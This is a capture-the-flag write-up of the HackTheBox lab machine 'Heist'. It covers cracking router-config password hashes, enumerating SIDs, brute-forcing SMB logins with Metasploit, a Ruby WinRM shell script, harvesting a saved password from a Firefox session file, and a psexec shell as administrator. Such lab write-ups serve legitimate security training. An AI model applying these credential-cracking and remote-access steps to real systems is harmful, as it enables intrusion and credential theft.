# Heist - HackTheBox
## Windows - Easy

### Nmap
We have HTTP, SMB, WinRM on ports 80, 445, 5986, as well as other useless Windows services.

### HTTP
We are greeted by a login page. Trying some usual creds doesn't work. However, we can login as a guest. Doing so, we are redirected to `issues.php`, where a user called `hazard` asks for support for his router. He gives a router config file `config.txt`:
```
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408

--- snip ---
```
We crack the `$1$` hash using hashcat and rockyou, and find the password `stealth1agent`.

The other two hashes are Cisco hashes and can be cracked using this [site](http://www.ifm.net.nz/cookbooks/passwordcracker.html).

Afterwards, the `hazard` user asks to have an account on the server.

### SMB
We try to login to SMB as `hazard` with the cracked passwords found above. `stealth1agent` works. However we only have access to `IPC$` which doesn't give anything.

We need to find other usernames for the other hashes. We use impacket's `lookupsid.py`:
```bash
$ lookupsid.py hazard:stealth1agent@10.10.10.149
Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation

[*] Brute forcing SIDs at 10.10.10.149
[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
```

We create a `users.txt`:
```
Administrator
Guest
DefaultAccount
WDAGUtilityAccount
None
Hazard
support
Chase
Jason
```
and `passes.txt`:
```
stealth1agent
$uperP@ssword
Q4)sJu\Y8qz*A3?d
```
to bruteforce creds. We do so using the metasploit module `auxiliary/scanner/smb/smb_login` with these files and get a positive on `Chase:Q4)sJu\Y8qz*A3?d`.

### WinRM
We get a shell on the box using the creds above and WinRM. We use the ruby script:
```ruby
require 'winrm'

conn = WinRM::Connection.new( 
  endpoint: 'http://10.10.10.149:5985/wsman',
  user: 'Chase',
  password: 'Q4)sJu\Y8qz*A3?d',
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        print "PS > "
        command = gets        
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end    
    puts "Exiting with code #{output.exitcode}"
end
```
which gives us a shell as `Chase`. We can get the `user.txt` there.

### PrivEsc
Running `ps` we get the running processes. Firefox stands out. We go to the FireFox profile of our users at `C:\Users\Chase\AppData\Roaming\Mozilla\Firefox\Profiles` and download it to our box (using meterpreter for example).

Grepping for `password` in this profile directory gives this interesting result:
```bash
$ grep -a -R -i password .
--- snip ---
./sessionstore-backups/recovery.jsonlz4:password=4dD!5}x/re8]FBuZ n
--- snip ---
```
Looking at this file in more details, we get:
```
--- snip ---
5��://local2�/issues.phpI
R�! I��e4b94c39-95b2-47e7-b235-a3d1e0293736�
z
�Plogin�?
_���=admin@support.htb&!�
password=4dD!5}x/re8]FBuZ n
--- snip ---
```
This suggests that `admin@support.htb:4dD!5}x/re8]FBuZ` is a valid cred for the login page. Trying it and it works!

Trying the cred `admin:4dD!5}x/re8]FBuZ` on SMB, we have WRITE access everywhere. So we can `psexec` and get a shell as root!

